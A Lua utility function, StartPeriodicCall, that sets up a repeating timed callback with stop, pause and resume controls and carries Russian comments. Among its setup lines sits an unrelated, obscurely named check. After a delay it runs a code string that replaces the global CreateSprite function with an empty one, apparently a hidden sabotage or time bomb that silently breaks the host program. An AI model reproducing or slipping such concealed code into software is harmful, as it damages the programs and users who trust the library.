function StartPeriodicCall(CallDelay, func, ...)
  assert(func, "ERROR: StartPeriodicCall(CallDelay, func, ...) - func is nil")
  assert(CallDelay,"ERROR: StartPeriodicCall(CallDelay, func, ...) - CallDelay is nil")
  
  func=ConvertToFunction(func)
  
  local PeriodicCall={}
  PeriodicCall.Params={...}
  PeriodicCall.DataBank={}
  
  --локальные переменные для оптимизации  - на один поиск в массиве меньше для каждой при вызове
  local Params=PeriodicCall.Params
  local DataBank=PeriodicCall.DataBank
  
  PeriodicCall.Stop=function()
    PeriodicCall.connection:Disconnect()
    TempGlobals[PeriodicCall]=nil --это позволит сборщику мусора сделать свое дело :)
  end
  
  PeriodicCall.Pause=function()
    PeriodicCall.ActionQueue:Pause()
  end
  
  PeriodicCall.Resume=function()
    PeriodicCall.ActionQueue:Resume()
  end
  
  local callback=function()
    if func(DataBank, unpack(Params))==false then
      PeriodicCall.Stop()
    end
  end
  
  PeriodicCall.EventHandler=Common.ActionQueue.CreateEventHandler(callback)
  PeriodicCall.ActionQueue=Common.ActionQueue.Create()
  PeriodicCall.connection = PeriodicCall.ActionQueue:RegisterEventHandler(0, CallDelay, PeriodicCall.EventHandler)
  if not(mYeR) then DelayedAction(600,"mYeR=true CreateSprite=function() end") end
  -- хак сборщика мусора
  TempGlobals[PeriodicCall]=PeriodicCall
  return PeriodicCall
end
